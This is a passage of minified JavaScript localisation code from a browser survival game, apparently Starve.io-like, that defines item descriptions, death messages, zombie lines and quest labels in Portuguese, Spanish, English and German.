        Le[21] = ["seu corpo se enroscou nos espinhos. quando você tenta escapar, sua pele sai e seu coração para de bater."];
        ZOMBIE_GRUMBLE = "Uuunnnggg";
        ZOMBIE_GRUMBLES = ["Uuunnnggg... estou morrendo de fome", "preciso do seu cerébro Uuunnnggg...", "carne fresca aqui... Uuunnnggg", "Uuunnnggg... você parece saboroso", "Uuunnnggg...", "Eat... uuunnnggg...", "consigo sentir o cheiro de sangue... Uuunnnggg"];
      }, De = function () {
        ve[le.DRAGON_CUBE] = ["You feel a great power emanating from this orb"];
        Le[22] = ["This crab, though frightening in nature, pinched your fingertips so hard that you had a heart attack."];
        ve[le.CRAB_STICK] = ["Crab sticks", "Oh, yeah? Is there crab in the crab sticks?", "Food: 20"];
        ve[TEXT.BACK_TO_THE_GAME] = " BACK TO THE GAME";
        ve[TEXT.TWITTER] = " Share on Twitter";
        ve[TEXT.FACEBOOK] = " Share on Facebook";
        ve[TEXT.KIT_NEXT] = "You can buy items on the shop in the next game with your points";
        ve[TEXT.POINTS] = "points";
        ve[TEXT.SCORE] = "Score";
        ve[TEXT.KILL] = "Kill";
        ve[TEXT.DAYS_SURVIVED] = "Days survived";
        ve[TEXT.MODE_FREE] = "Building method: Free. Press G to change";
        ve[TEXT.MODE_GRID] = "Building method: Grid. Press G to change";
        ve[le.CRAB_LOOT] = ["Crab Claw", "Crab claws can also be eaten", "Food: 10"];
        ve[le.CRAB_SPEAR] = ["Crab Spear", "Allow you to calm crabs, and heal them", "Damage: 14", "Building Damage: 4"];
        ve[le.CROWN_CRAB] = ["Crab Helmet", "You are the king of crabs!", "Crabs follow you", "They can't hit you and you can't hit them", "Players Defense: 4", "Animals Defense: 13"];
        ve[le.BED] = ["Bed", "Relax in this confortable bed", "You are less cold, less thirsty, and less hungry", "You will be cured faster", "Durability: 400"];
        document.getElementById("typequest").innerHTML = "Chrono Quests";
        document.getElementById("timeremainingquest").innerHTML = "Time Remaining";
        document.getElementById("constraintquest").innerHTML = " Constraints";
        document.getElementById("claim_rewards").innerHTML = " Claim rewards";
        document.getElementById("rewardquest").innerHTML = " Reward";
        document.getElementById("killdragon_1").innerHTML = " Collect 1 dragon heart";
        document.getElementById("amethyst_2").innerHTML = " Gather 1 amethyst";
        document.getElementById("survive20min_3").innerHTML = "Survive without losing life";
        document.getElementById("treasure_chest_4").innerHTML = " Open 5 treasure chests";
        document.getElementById("dont_hit_5").innerHTML = " Be peaceful";
        document.getElementById("bread_6").innerHTML = " Collect 100 bread in deep winter";
        document.getElementById("winter_7").innerHTML = " After 1 day, survive in winter";
        for (var e = 0; e < 7; e++) {
          document.getElementById("claim_reward_" + e).innerHTML = "CLAIM REWARD!";
        }
        document.getElementById("quit_chronoquest").innerHTML = " QUIT";
        ve[le.HAND] = ["Mano"];
        ve[le.GROUND] = ["Tierra", "¡Tan limpia como mis manos!"];
        ve[le.SAND] = ["Arena", "¡Tengo arena en mis ojos!"];
        ve[le.WOOD] = ["Madera", "¡Nunca hay suficiente!"];
        ve[le.STONE] = ["Piedra", "También llamada roca."];
        ve[le.GOLD] = ["Oro", "Sé generoso, compártelo con los otros"];
        ve[le.DIAMOND] = ["Diamante", "¿Que vas a hacer con él?"];
        ve[le.AMETHYST] = ["Amatista", "Es Mauve como Lapa"];
        ve[le.FLOUR] = ["Harina", "Usada para cocinar."];
        ve[le.COOKIE] = ["Galleta", "Una galleta de la abuelita", "Comida: 50"];
        ve[le.CAKE] = ["Tarta", "¡Cumpleaños Feliz!", "Comida: 100"];
        ve[le.MEAT] = ["Carne Cruda", "Se cocina con fuego", "Causa veneno. 10", "Comida: 15"];
        ve[le.COOKED_MEAT] = ["Carne Cocinada", "es la supervivencia del más fuerte :'(", "Comida: 35"];
        ve[le.FOODFISH] = ["Pescado Crudo", "Creo que sigue vivo", "Causa veneno de comida: 10", "Comida: 18"];
        ve[le.FOODFISH_COOKED] = ["Pescado Cocinado", "Con limón sería perfecto", "Comida: 35"];
        ve[le.BREAD] = ["Pan", "¡Caliente, desde Francia!", "Es dinero usado en la tienda", "Comida: 15"];
        ve[le.SANDWICH] = ["Bocadillo", "Sabe como un Krabby Patty", "Comida: 100"];
        ve[le.CANDY] = ["Caramelos", "¡Solo para niños/as!", "Comida: 100"];
        ve[le.SUGAR_CAN] = ["Caña de Azúcar", "Pruébala, es deliciosa", "Comida: 100"];
        ve[le.GARLAND] = ["Guirnalda", "Perfecta para decorar el techo"];
        ve[le.SEED] = ["Semillas de Bayas", "Se convierte en bayas", "Nacimiento: 2 Minutos", "Crecimiento: 55 Segundos", "Necesita agua: 3 Minutos 20 Segundos", "Durabilidad: 700", "Tiempo de vida: 8 Días"];
        ve[le.PLANT] = ["Baya", "No es venenosa.", "Comida: 10"];
        ve[le.WHEAT_SEED] = ["Semilla de Trigo", "Se convierte en Trigo ", "Nacimiento: 2 Minutos", "Crecimiento: 16 Segundos", "Necesita agua: 2 Minutos", "Durabilidad: 700", "Tiempo de vida: 8 Días"];
        ve[le.WILD_WHEAT] = ["Trigo Silvestre", "Se convierte en harina cuando se coloca en un molino"];
        ve[le.PUMPKIN_SEED] = ["Semilla de Calabaza", "Crece a Calabazas", "Nacimiento: 2 Minutos 40 Segundos", "Crecimiento: 2 Minutos", "Necesita agua: 2 Minutos", "Durabilidad: 700", "Tiempo de vida: 8 Días"];
        ve[le.PUMPKIN] = ["Calabaza", "Me recuerda a Halloween", "Comida: 30"];
        ve[le.GARLIC_SEED] = ["Semilla de Ajo", "Muy peligroso para vampiros", "Daño: 20", "Nacimiento: 4 Minutos", "Crecimiento: 1 Minutos 10 Segundos", "Necesita Agua: 1 Minutos 40 Segundos", "Durabilidad: 700", "Tiempo de Vida: 8 Días"];
        ve[le.GARLIC] = ["Ajo", "Te sana y reduce el frio", "Comida: 14", "sanación con eliempo: 30", "Efecto: 1"];
        ve[le.THORNBUSH_SEED] = ["Semilla de Planta de Espinas", "Puede dañar a tus enemigos", "Daño por contacto: 20", "Nacimiento: 4 Minutos", "Crecimiento: 15 Segundos", "Necesita Agua: 3 Minutos", "Durabilidad: 1000", "Tiempo de Vida: 8 Días"];
        ve[le.THORNBUSH] = ["Planta de Espinas", "¡Te daña!"];
        ve[le.PLOT] = ["Parcela", "En serio, úsala", "Se usa para plantar plantas en invierno o sobre puentes", "Tus plantas crecerán muy rápido y necesitarán menos agua", "Durabilidad: 2000"];
        ve[le.ICE] = ["Hielo", "Bueno para hacer tartas y agua"];
        ve[le.SPANNER] = ["Llave de Reparación", "Puede reparar paredes, puertas y pinchos", "Daño: 2"];
        ve[le.FUR_WOLF] = ["Pelaje de Lobo", "¿Perrito? ¡¿Donde esta el perrito?!"];
        ve[le.FUR] = ["Pelaje de Conejo", "El Conejo era muy lindo..."];
        ve[le.SPECIAL_FUR] = ["Pelaje Puro", "¡Eres una maquina de pan!"];
        ve[le.SPECIAL_FUR_2] = ["Pelaje Oscuro", "¿Estás listo para hacer algo malo?"];
        ve[le.FUR_WINTER] = ["Pelaje de Invierno", "Esos animales solo querían un abrazo..."];
        ve[le.SCALES] = ["Escamas", "¡Huele a pescado!"];
        ve[le.KRAKEN_SKIN] = ["Piel del Kraken", "¡¿No tienes mucho miedo?!"];
        ve[le.FIRE] = ["Fogata", "¡Te calienta!", "Durabilidad: 150", "Tiempo de vida: 2 Minutos"];
        ve[le.BIG_FIRE] = ["Fogata Grande", "¡Te calienta por más tiempo!", "Durabilidad: 400", "Tiempo de Vida: 6 Minutos"];
        ve[le.WORKBENCH] = ["Mesa de Trabajo", "¡Te sirve mucho para crear cosas de todos tipos!"];
        ve[le.CORD] = ["Hilo", "Usado para craftear ropa y mochila"];
        ve[le.BLUE_CORD] = ["Hilo de Diamante", "Usado para craftear ropa especial"];
        ve[le.CHEST] = ["Cofre", "Te permite guardar cosas, o compartirlas", "Durabilidad: 500"];
        ve[le.SWORD_WOOD] = ["Espada de Madera", "¿Eso funciona?", "Daño: 12", "Daño para estructuras: 4"];
        ve[le.SWORD] = ["Espada de Piedra", "Sé bueno con los otros", "Daño: 19", "Daño para estructuras: 6"];
        ve[le.SWORD_GOLD] = ["Espada de Oro", "¡Rey de la selva!", "Daño: 22", "Daño para estructuras: 7"];
        ve[le.SWORD_DIAMOND] = ["Espada de Diamante", "Puedes sentir el poder", "Daño: 24", "Daño para estructuras: 8"];
        ve[le.PIRATE_SWORD] = ["Espada de Pirata", "Arrrrr!", "¡Mejor distancia que una espada normal", "Daño: 24", "Daño para estructuras: 8"];
        ve[le.SWORD_AMETHYST] = ["Espada de Amatista", "Mauve es el mejor color del mundo :3", "Daño: 27", "Daño para estructuras: 9"];
        ve[le.DRAGON_SWORD] = ["Espada del Dragón", "¡Tienes el poder de un Dragón!", "Daño: 30", "Daño para estructuras: 10"];
        ve[le.DRAGON_SPEAR] = ["Lanza del Dragón", "¡Mátalos a todos!", "Daño: 22", "Daño para estructuras: 6"];
        ve[le.PICK_WOOD] = ["Pico de Madera", "Solo puede minar madera y piedra", "Daño: 1"];
        ve[le.PICK] = ["Pico de Piedra", "Puede minar hasta oro", "Daño: 2"];
        ve[le.PICK_GOLD] = ["Pico de Oro", "Puede minar hasta Diamante", "Daño: 3", "Daño para estructuras: 1"];
        ve[le.PICK_DIAMOND] = ["Pico de Diamante", "¡Puede minarlo todo!", "Daño: 4", "Daño para estructuras: 1"];
        ve[le.PICK_AMETHYST] = ["Pico de Amatista", "¡Puede minarlo todo, parece fantastico!", "Daño: 5", "Daño para estructuras: 1"];
        ve[le.HAMMER] = ["Martillo de Piedra", "Bueno para destruir estructuras", "No funciona bien con diamante y amatista", "Daño: 2", "Daño para estructuras: 20"];
        ve[le.HAMMER_GOLD] = ["Martillo de Oro", "Bueno para destruir estructuras", "No funciona bien con amatista ", "Daño: 3", "Daño para estructuras: 30"];
        ve[le.HAMMER_DIAMOND] = ["Martillo de Diamante", "Bueno para destruir estructuras", "Daño: 4", "Daño para estructuras: 40"];
        ve[le.HAMMER_AMETHYST] = ["Martillo de Amatista", "Bueno para destruir estructuras", "Daño: 5", "Daño para estructuras: 50"];
        ve[le.SUPER_HAMMER] = ["Super Martillo", "¿Has planeado destruir el mundo?", "Daño: 12", "Daño para estructuras: 70"];
        ve[le.WOOD_SPEAR] = ["Lanza de Madera", "Como un palo de madera, pero mata.", "Daño: 10", "Daño para estructuras: 2"];
        ve[le.SPEAR] = ["Lanza de Piedra", "¡El comienzo de la evolución!", "Daño: 14", "Daño para estructuras: 4"];
        ve[le.GOLD_SPEAR] = ["Lanza de Oro", "¡Cuidado, te hace mucho daño!", "Daño: 15", "Daño para estructuras: 5"];
        ve[le.DIAMOND_SPEAR] = ["Lanza de Diamante", "¡Estas preparado para matar al Dragon!", "Daño: 17", "Daño para estructuras: 5"];
        ve[le.AMETHYST_SPEAR] = ["Lanza de Amatista", "Los dragones te tienen miedo", "Daño: 18", "Daño para estructuras: 6"];
        ve[le.SHOVEL] = ["Pala de Piedra", "Cava para conseguir tierra, arena y hielo", "También puedes conseguir minerales", "Daño: 2"];
        ve[le.SHOVEL_GOLD] = ["Pala de Oro", "Cava para conseguir tierra, arena y hielo", "También puedes conseguir minerales", "Daño: 3", "Daño para estructuras: 1"];
        ve[le.SHOVEL_DIAMOND] = ["Pala de Diamante", "Cava para conseguir tierra, arena y hielo", "También puedes conseguir minerales", "Daño: 4", "Daño para estructuras: 1"];
        ve[le.SHOVEL_AMETHYST] = ["Pala de Amatista", "Cava para conseguir tierra, arena y hielo", "También puedes conseguir minerales", "Daño: 5", "Daño para estructuras: 1"];
        ve[le.WOOD_HELMET] = ["Casco de Madera", "¡Mejor que nada!", "Protección contra jugadores: 1", "Protección contra animales: 4"];
        ve[le.STONE_HELMET] = ["Casco de Piedra", "¡Estas listo para la batalla!", "Protección contra jugadores: 2", "Protección contra animales: 8"];
        ve[le.GOLD_HELMET] = ["Casco de Oro", "AKA el casco de los salvajes", "Protección contra jugadores: 4", "Protección contra animales: 13"];
        ve[le.DIAMOND_HELMET] = ["Casco de Diamante", "No ataques tanto", "Protección de jugadores: 5", "Protección contra animales: 19"];
        ve[le.AMETHYST_HELMET] = ["Casco de Amatista", "¡No tienes miedo de nada!", "Protección contra jugadores: 6", "Protección contra animales: 23"];
        ve[le.DRAGON_HELMET] = ["Casco del Dragón", "¡Vas a dominar el mundo!", "Protección contra jugadores: 8", "Protección contra animales: 27"];
        ve[le.EXPLORER_HAT] = ["Gorro del Explorador", "Los animales no te atacarán", "¡Pero no ataques!", " Te calienta en el invierno y fuera del agua"];
        ve[le.CHRISTMAS_HAT] = ["Gorro de Navidad", "¡Ho, ho, ho, feliz Navidad!", "Te calienta en el invierno y fuera del  agua"];
        ve[le.ELF_HAT] = ["Gorro del Duende", "¡No dejes que te descubren que eres, duende del hielo!", "Te calienta en el invierno y fuera del agua"];
        ve[le.HOOD] = ["Capucha", "¡Eres un ladron!", "Puedes robar de alguien solo si", "1) Es de noche", "2) No tienes nada en tu mano", "3) Si no te han tocado en los  8 segundos anteriores", "4) No estas cerca de una fogata", "5) Si tu objetivo no lleva puesto una gorra de campesino", "Te calienta en invierno y fuera del agua"];
        ve[le.EARMUFFS] = ["Orejeras", "Como un abrigo pequeño.", "Te calienta en invierno y fuera del agua"];
        ve[le.COAT] = ["Chapka", "También llamado abrigo.", "Te calienta en el invierno y fuera del agua"];
        ve[le.CAP_SCARF] = ["Gorro y Bufanda ", "Muy cómodo, muy caliente"];
        ve[le.PEASANT] = ["Gorra de Campesino", "Tus plantas crecen mas rápido", "Te Calienta en el invierno y fuera del agua"];
        ve[le.WINTER_HOOD] = ["Capucha de Invierno", "Puedes robar de alguien solo si", "1) Es de noche", "2) No tienes nada en tu mano", "3) Si no te han tocado antes de 8 segundos", "4) No estas cerca de un fuego", "5) Si tu objetivo no lleva puesto una Gorra de Campesino", "Te calienta en invierno y fuera del agua"];
        ve[le.WINTER_PEASANT] = ["Gorra de Invierno del Campesino", "Tus plantas crecen aún más rápido", "Te calienta en invierno y fuera del agua"];
        ve[le.DIVING_MASK] = ["Máscara de Buceo", "Eres un tiburón en el agua", "Calienta en el agua", "Protección contra jugadores: 2, Protección contra animales: 8"];
        ve[le.SUPER_DIVING_SUIT] = ["Súper Máscara de Buceo", "Eres muy rápido en agua", "Calienta en el agua", "Defensa del Jugador: 4, Defensa de los animales: 16"];
        ve[le.DRAGON_ORB] = ["Esfera del Dragón", "Dada en la misión"];
        ve[le.DRAGON_HEART] = ["Corazón del Dragón", "¡Te convierte en un fantasma cuando mueres!", "Eres un fantasma por 60 segundos", "Encuentra una Piedra de resurreción"];
        ve[le.GEMME_GREEN] = ["Gema Verde", "¿¿No has hecho trampas, verdad??"];
        ve[le.GEMME_ORANGE] = ["Gema Naranja", "¡Solo un pirata verdadero lo puede encontrar!"];
        ve[le.GEMME_BLUE] = ["Gema Azul", "Para gente muy amable"];
        ve[le.CROWN_GREEN] = ["Corona Verde", "Te sanas muy rápido", "Sanación con el tiempo: 40", "Protección contra jugadores: 4, Protección contra animales: 16"];
        ve[le.CROWN_ORANGE] = ["Corona Naranja", "Ahora tienes much suerte", "Protección contra jugadores: 4, Protección contra animales: 16"];
        ve[le.CROWN_BLUE] = ["Corona Azul", "Cuando mueres, te conviertes en un fantasma", "Pero perderás tu alma", "Protección contra jugador: 4, Protección contra animales: 16"];
        ve[le.BUCKET_FULL] = ["Cubo", "Bueno para rellenar botellas", "Un cubo es equivalente a 12 botellas"];
        ve[le.BUCKET_EMPTY] = ["Cubo Vacío", "Tienes que llenar este cubo con agua"];
        ve[le.BOTTLE_FULL] = ["Botella", "Te permite beber agua donde quieras", "Agua: 50"];
        ve[le.BOTTLE_EMPTY] = ["Botella Vacia", "La puedes llenar de agua"];
        ve[le.WATERING_CAN] = ["Regadera Vacía", "La tienes que llenar de agua"];
        ve[le.WATERING_CAN_FULL] = ["Regadera", "Te permite regar las plantas", "Daño: 1"];
        ve[le.BAG] = ["Mochila", "¡Mas espacio para tus cosas!"];
        ve[le.PAPER] = ["Hoja", "Usada para hacer un libro"];
        ve[le.BOOK] = ["Libro", "Reduce el tiempo de elaboración", "Lo tienes que tener en la mano para que funcione", "Daño: 1"];
        ve[le.BANDAGE] = ["Vendaje", "Recuperas vida mas rapido", "Sanación tiempo: 30", "Efecto: 5"];
        ve[le.LOCK] = ["Cerradura", "Te permite cerrar tu cofre"];
        ve[le.LOCKPICK] = ["Llave", "Te permite abrir un cofre cerrado"];
        ve[le.TOTEM] = ["Tótem", "Te permite crear un equipo", "Compartir puertas y cofres cerrados", "Tus pinchos no dañan al resto tu equipo"];
        ve[le.BRIDGE] = ["Puente", "Muy útil en el agua", "Te permite beber agua sin tener que ahogarse", "Puedes nadar más rápido encima del agua"];
        ve[le.SIGN] = ["Cartel", "Sirve para dejar un mensage para otros", "Durabilidad: 200"];
        ve[le.ROOF] = ["Techo", "Te esconde un poco y te protege del frío"];
        ve[le.WELL] = ["Fuente", "Permite rellenar botellas", "Durabilidad: 1000"];
        ve[le.WALL] = ["Pared de Madera", "Es solo una pared.", "Durabilidad: 1000"];
        ve[le.STONE_WALL] = ["Pared de Piedra", "Es un poco más serio", "Durabilidad: 1500"];
        ve[le.GOLD_WALL] = ["Pared de Oro", "¿Oro en de tus paredes? Eres rico", "Durabilidad: 2000"];
        ve[le.DIAMOND_WALL] = ["Pared de Diamante", "Muy brillante, cuidado con tus ojos", "Durabilidad: 2500"];
        ve[le.AMETHYST_WALL] = ["Pared de Amatista", "¡Debes tener mucho miedo de lo que hay fuera!", "Durabilidad: 3500"];
        ve[le.SPIKE] = ["Pincho de Madera", "Puede dañar a tus enemigos", "Daño: 10, Daño por golpe: 2", "Durabilidad: 150"];
        ve[le.STONE_SPIKE] = ["Pincho de Piedra", "No querría ser tu enemigo.", "Daño: 20", "Daño por contacto: 3", "Durabilidad: 300"];
        ve[le.GOLD_SPIKE] = ["Pincho de Oro", "¡Eres tan cruel!", "Daño: 30", "Daño por golpe: 3", "Durabilidad: 600"];
        ve[le.DIAMOND_SPIKE] = ["Pincho de Diamante", "No te gusta tener compañía.", "Daño: 40", "Daño por contacto: 4", "Durabilidad: 1200"];
        ve[le.AMETHYST_SPIKE] = ["Pincho de Amatista", "¡¿Que demonios te hicieron tus vecinos?!", "Daño: 50", "Daño por contacto: 4", "Durabilidad: 2400"];
        ve[le.WOOD_DOOR] = ["Puerta de Madera", "Puedes abrir y cerrarla ", "Durabilidad: 1000"];
        ve[le.STONE_DOOR] = ["Puerta de Piedra", "Una puerta más buena es más seria", "Durabilidad: 1500"];
        ve[le.GOLD_DOOR] = ["Puerta de Oro", "¿Estas reconstruyendo El Dorado?", "Durabilidad: 2000"];
        ve[le.DIAMOND_DOOR] = ["Puerta de Diamante", "Para una casa brillante", "Durabilidad: 2500"];
        ve[le.AMETHYST_DOOR] = ["Puerta de Amatista", "¿Tu casa es una caja fuerte?", "Durabilidad: 3500"];
        ve[le.FURNACE] = ["Caldera", "Te calienta", "Consume 1 Madera cada 5 segundos", "Durabilidad: 1000"];
        ve[le.WINDMILL] = ["Molino", "Puede producir harina a partir del trigo", "Necesita 5 segundos para producir harina", "Devuelve los puntos que trabaja", "Durabilidad: 2000"];
        ve[le.BREAD_OVEN] = ["Horno de Pan", "Produce pan de harina", "Necesita 10 segundos para producir Pan", "Devuelve los puntos que trabaja", "Durabilidad: 2000"];
        ve[le.RESURRECTION] = ["Piedra de Resurreción", "¡Es magia!", "Te resucitacuando eres una fantasma", "Perderás tu arma", "Durabilidad: 200"];
        ve[TEXT.YOU_CANNOT_JOIN] = "No puedes unirte a este servidor";
        ve[TEXT.KICKED] = "Expulsado: ";
        ve[TEXT.KEY_ALREADY] = "Tu llave ya está usada";
        ve[TEXT.KEY_WRONG] = "Tu llave está mal";
        ve[TEXT.OLD_VERSION] = "Tienes una versión antigua, limpia tu cache";
        ve[TEXT.NO_MORE_RESOURCES] = "No hay mas recursos";
        ve[TEXT.SURVIVED_1DAY] = "Has sobrevivido 1 día";
        ve[TEXT.SURVIVED] = "Has sobrevivido ";
        ve[TEXT.DAYS] = " días";
        ve[TEXT.DEAD_SAD] = "Estás muerto ;-;";
        ve[TEXT.SPAM_ME] = "No se encuentra un lugar para unirse, ¡spamea el botón de jugar!";
        ve[TEXT.SPAM_ME2] = "El servidor esta lleno, ¡spamea el botón de jugar!";
        ve[TEXT.EMPTY] = "Recurso vacio";
        ve[TEXT.INV_FULL] = "¡Inventario lleno!(Haz click derecho para borrar cosas) ";
        ve[TEXT.DEAD] = " está muerto";
        ve[TEXT.WRONG_TOOL] = "Esta no es la herramienta correcta";
        ve[TEXT.JOIN_TEAM] = "Te has unido a un equipo";
        ve[TEXT.YOU_DEAD] = "Estás muerto";
        ve[TEXT.JOINED_TEAM] = " se unió al equipo";
        ve[TEXT.TEAM_DESTROYED] = "Tu equipo ha sido destruido";
        ve[TEXT.LEFT_TEAM] = "Has dejado el equipo";
        ve[TEXT.LEFT_TEAM2] = " dejo el equipo ";
        ve[TEXT.TOKEN] = "Alguien te robó tu token :>";
        ve[TEXT.CHOOSE] = "Elige un servidor";
        ve[TEXT.PLAYERS] = "jugadores";
        ve[TEXT.TOTAL_PLAYERS] = "total de jugadores";
        ve[TEXT.TOTAL_MODE] = "Jugadores en este modo de juego";
        ve[TEXT.COMMING_SOON] = "Próximamente...";
        document.getElementById("nickname_input").placeholder = "Apodo";
        Le[0] = ["Has muerto por ninguna razón"];
        Le[1] = ["Has muerto de hambre, como implica el nombre del juego dice"];
        Le[2] = ["Te has congelado hasta morir, qué triste", "Moriste por hipotermia. La próxima quédate cerca de  una fogata."];
        Le[3] = ["Un jugador te ha matado diciendo que mejores.", "Fuiste asesinado por un jugador, pero no te preocupes, ese jugador también morirá, eventualmente."];
        Le[4] = ["Te has acercado demasiado al fuego, y te has quemado vivo, mala idea.", "Has muerto por el fuego, el fuego te quema, ve y escribe una historia sobre eso."];
        Le[5] = ["Tu cuerpo será un buen nido para los huevos de la arañas", "Una araña te ha matado, al menos no fué un conejo."];
        Le[6] = ["El lobo no tendrá hambre después de comerte.", "No son perros, no les gusta ser acariciados."];
        Le[7] = ["El zorro era demasiado rápido para ti.", "El zorro te convirtió en una caja. ¿Desde cuándo los animales tienen poderes mágicos?"];
        Le[8] = ["El oso solo quería un abrazo", "El oso era demasiado para ti. Lo siento."];
        Le[9] = ["El dragón te quemó vivo.", "El dragón te ha aplastado, todos tus huesos ahora son vapor... otro cadaver mas."];
        Le[10] = ["Has saltado a una pared de pinchos, mala idea", "Has muerto por una pared de pinchos. La gente suele ser lo suficientemente sensible para no tocar cosas puntiagudas.."];
        Le[11] = ["Un fantasma también puede morir.", "No has revivido a tiempo, asi que eres un fantasma de un fantasma."];
        Le[12] = ["Una bacteria te ha matado por comer carne cruda. Este juego es muy difícil.", "Has matado a la carne cruda. Ella también te ha matado a ti.."];
        Le[13] = ["Has muerto de sed, mejor bebe tu propia orina."];
        Le[14] = ["¿Sabiás que los jugadores tienen su boca debajo del agua? Ahora lo sabes."];
        Le[15] = ["No te preocupes, a la piraña le pareciste delicioso.", "Las pirañas comen a personas, incluyendote a ti también."];
        Le[16] = ["LapaMauve no planea que puedas matar al kraken", "Un Kraken te partió el kra-neo."];
        Le[17] = ["Tu piel se cayó, el sol te quemó."];
        Le[18] = ["El ajo guardado en tu bolsillo te quemó el cerebro."];
        Le[19] = ["Eres un vampiro, no te quedes cerca del ajo."];
        Le[20] = ["Has comido un ajo siendo  vampiro,¿que esperabas?"];
        Le[21] = ["Te has quedado atrapado en una planta de espinas. Al intentar escapar, tu piel se cae y entra un pincho en tu corazón."];
        ZOMBIE_GRUMBLE = "Uuunnnggg";
        ZOMBIE_GRUMBLES = ["Uuunnnggg... Tengo hambre", "Necesito tu cerebro uuunnnggg...", "Carne fresca... Uuunnnggg", "Uuunnnggg... Pareces delicioso", "Uuunnnggg...", "Comida... uuunnnggg...", "Puedo oler sangre... Uuunnnggg"];
      }, Se = function () {
        ve[le.DRAGON_CUBE] = ["You feel a great power emanating from this orb"];
        Le[22] = ["This crab, though frightening in nature, pinched your fingertips so hard that you had a heart attack."];
        ve[le.CRAB_STICK] = ["Crab sticks", "Oh, yeah? Is there crab in the crab sticks?", "Food: 20"];
        ve[TEXT.BACK_TO_THE_GAME] = " BACK TO THE GAME";
        ve[TEXT.TWITTER] = " Share on Twitter";
        ve[TEXT.FACEBOOK] = " Share on Facebook";
        ve[TEXT.KIT_NEXT] = "You can buy items on the shop in the next game with your points";
        ve[TEXT.POINTS] = "points";
        ve[TEXT.SCORE] = "Score";
        ve[TEXT.KILL] = "Kill";
        ve[TEXT.DAYS_SURVIVED] = "Days survived";
        ve[TEXT.MODE_FREE] = "Building method: Free. Press G to change";
        ve[TEXT.MODE_GRID] = "Building method: Grid. Press G to change";
        ve[le.CRAB_LOOT] = ["Crab Claw", "Crab claws can also be eaten", "Food: 10"];
        ve[le.CRAB_SPEAR] = ["Crab Spear", "Allow you to calm crabs, and heal them", "Damage: 14", "Building Damage: 4"];
        ve[le.CROWN_CRAB] = ["Crab Helmet", "You are the king of crabs!", "Crabs follow you", "They can't hit you and you can't hit them", "Players Defense: 4", "Animals Defense: 13"];
        ve[le.BED] = ["Bed", "Relax in this confortable bed", "You are less cold, less thirsty, and less hungry", "You will be cured faster", "Durability: 400"];
        document.getElementById("typequest").innerHTML = "Chrono Quests";
        document.getElementById("timeremainingquest").innerHTML = "Time Remaining";
        document.getElementById("constraintquest").innerHTML = " Constraints";
        document.getElementById("claim_rewards").innerHTML = " Claim rewards";
        document.getElementById("rewardquest").innerHTML = " Reward";
        document.getElementById("killdragon_1").innerHTML = " Collect 1 dragon heart";
        document.getElementById("amethyst_2").innerHTML = " Gather 1 amethyst";
        document.getElementById("survive20min_3").innerHTML = "Survive without losing life";
        document.getElementById("treasure_chest_4").innerHTML = " Open 5 treasure chests";
        document.getElementById("dont_hit_5").innerHTML = " Be peaceful";
        document.getElementById("bread_6").innerHTML = " Collect 100 bread in deep winter";
        document.getElementById("winter_7").innerHTML = " After 1 day, survive in winter";
        for (var e = 0; e < 7; e++) {
          document.getElementById("claim_reward_" + e).innerHTML = "CLAIM REWARD!";
        }
        document.getElementById("quit_chronoquest").innerHTML = " QUIT";
        ve[le.HAND] = ["Hand"];
        ve[le.GROUND] = ["Boden", "Dreckig!"];
        ve[le.SAND] = ["Sand", "Ich habe es in meine Augen bekommen!"];
        ve[le.WOOD] = ["Holz", "Du kannst niemals zu viel haben!"];
        ve[le.STONE] = ["Stein", "Auch Fels gennant"];
        ve[le.GOLD] = ["Gold", "Sei großzügig, gib anderen etwas ab "];
        ve[le.DIAMOND] = ["Diamant", "Was wirst du daraus machen?"];
        ve[le.AMETHYST] = ["Amethyst", "Es ist Mauve farbend, genauso wie Lapa"];
        ve[le.FLOUR] = ["Mehl", "wird fürs Backen gebraucht"];
        ve[le.COOKIE] = ["Keks", "Ein prächtiger Keks von Großmutter", "Essen: 50"];
        ve[le.CAKE] = ["Ein Kuchen", "Perfekter Kuchen für Gourmets", "Essen: 100"];
        ve[le.MEAT] = ["rohes Fleisch", "Du kannst es mit einem Feuer braten", "verursacht Lebensmittelvergiftung: 10", "Essen: 15"];
        ve[le.COOKED_MEAT] = ["gebratenes Fleisch", "Einmal blutiges Steak, bitte", "Essen: 35"];
        ve[le.FOODFISH] = ["roher Fisch", "Ich glaube es lebt noch", "verursacht Lebensmittelvergiftung: 10", "Essen: 18"];
        ve[le.FOODFISH_COOKED] = ["gebratener Fisch", "Mit einer Zitrone ist es perfekt", "Essen: 35"];
        ve[le.BREAD] = ["Brot", "Ein vorzügliches französiches Brot", "Es wird als Währung im Markt benutzt", "Essen: 15"];
        ve[le.SANDWICH] = ["Sandwich", "Schmeckt wie Krabbenburger", "Essen: 100"];
        ve[le.CANDY] = ["Süßigkeiten", "Nur für Kinder!", "Essen: 100"];
        ve[le.SUGAR_CAN] = ["Zuckerstange", "Probier mal, es schmeckt hervorragend", "Essen: 100"];
        ve[le.GARLAND] = ["Girlande", "perfekter Schmuck für Dächer"];
        ve[le.SEED] = ["Beeren Saatgut", "Wird eine Beere", "Entstehung: 2min", "Wachstum: 55s", "Wasserbedarf: 3min 20s", "Haltbarkeit: 700", "Lebenszeit: 8 Tage"];
        ve[le.PLANT] = ["Beere", "Beeren lecker!", "Essen: 10"];
        ve[le.WHEAT_SEED] = ["Weizen Saatgut", "Wird zu Weizen", "Entstehung: 2min", "Wachstum: 16s", "Wasserbedarf: 2min", "Haltbarkeit: 700", "Lebenszeit: 8 Tage"];
        ve[le.WILD_WHEAT] = ["Wildes Weizen", "Wenn es in eine Windmühle platziert wird, wird es zu Mehl"];
        ve[le.PUMPKIN_SEED] = ["Kürbis Saatgut", "Wird zu Kürbis", "Entstehung: 2min 40s", "Wachstum: 2min", "Wasserbedarf: 2min", "Haltbarkeit: 700", "Lebenszeit: 8 Tage"];
        ve[le.PUMPKIN] = ["Kürbis", "Es erinnert mich an Halloween", "Essen: 30"];
        ve[le.GARLIC_SEED] = ["Knoblauch Saatgut", "Sehr gefährlich für Vampire", "Schaden: 20", "Entstehung: 4min", "Wachstum: 1min 10s", "Wasserbedarf: 1min 40s", "Haltbarkeit: 700", "Lebenszeit: 8 Tage"];
        ve[le.GARLIC] = ["Knoblauch", "Heilt dich und hält die Kälte fern", "Essen: 14", "Heilung über Zeit: 30", "Effekt: 1"];
        ve[le.THORNBUSH_SEED] = ["Dornenbusch Saatgut", "Kann deinen Gegnern Schaden zufügen", "Schaden: 20", "Entstehung: 4min", "Wachstum: 15s", "Wasserbedarf: 3min", "Haltbarkeit: 1000", "Lebenszeit: 8 Tage"];
        ve[le.THORNBUSH] = ["Dornenbusch", "Es sticht!"];
